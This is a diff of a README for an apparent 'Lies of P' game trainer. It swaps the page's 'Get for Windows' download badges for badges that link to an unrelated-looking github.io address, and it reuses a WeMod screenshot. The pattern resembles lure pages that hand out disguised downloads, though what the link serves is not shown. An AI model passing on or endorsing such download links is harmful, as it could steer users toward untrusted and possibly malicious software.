@@ -5,10 +5,7 @@
 </div>
 <br>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://lies-of-p-puppet-master.github.io/.github/)
-</div>
+[![GET Lies of](https://img.shields.io/badge/GET%20%E2%80%94%20Lies-of-0078D6?style=for-the-badge&logoColor=white)](https://lnalenageieus.github.io/.github/Lies-of)
 
 ---
 
@@ -24,10 +21,8 @@ Story progression tools enable strategic influence over lie/truth decisions, cha
 <img src="https://api-cdn.wemod.com/screenshots/trainers/78856/en-us/1383788/2400.webp" width="auto">
 </div>
 
-<div align="center">
+[![GET Lies of](https://img.shields.io/badge/GET%20%E2%80%94%20Lies-of-0078D6?style=for-the-badge&logoColor=white)](https://lnalenageieus.github.io/.github/Lies-of)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://lies-of-p-puppet-master.github.io/.github/)
-</div>
 
 ---
 ### 🎛 Key Features
